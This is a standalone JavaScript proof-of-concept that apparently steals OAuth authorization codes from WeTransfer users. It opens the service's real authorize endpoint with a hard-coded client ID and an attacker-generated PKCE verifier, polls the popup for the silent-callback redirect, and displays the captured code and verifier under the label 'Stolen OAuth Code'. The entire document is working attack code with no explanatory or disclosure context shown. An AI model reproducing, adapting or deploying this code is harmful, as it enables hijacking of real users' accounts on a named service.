(async () => {
  const v = Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');
  const h = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v)));
  const c = btoa(String.fromCharCode(...h)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

  const authUrl = 'https://auth.wetransfer.com/authorize?response_mode=web_message&prompt=none'
    + '&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc'
    + '&response_type=code'
    + '&redirect_uri=' + encodeURIComponent('https://wetransfer.com/account/silent-callback')
    + '&code_challenge=' + encodeURIComponent(c)
    + '&code_challenge_method=S256'
    + '&state=' + Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');

  const w = window.open(authUrl);

  const poll = setInterval(() => {
    try {
      if (w.location.href.includes('silent-callback')) {
        clearInterval(poll);
        const code = new URLSearchParams(new URL(w.location.href).search).get('code');
        w.close();
        if (code) {
          alert('Stolen OAuth Code:\n' + code + '\n\nCode Verifier:\n' + v);
        }
      }
    } catch (e) {
    }
  }, 100);
})();
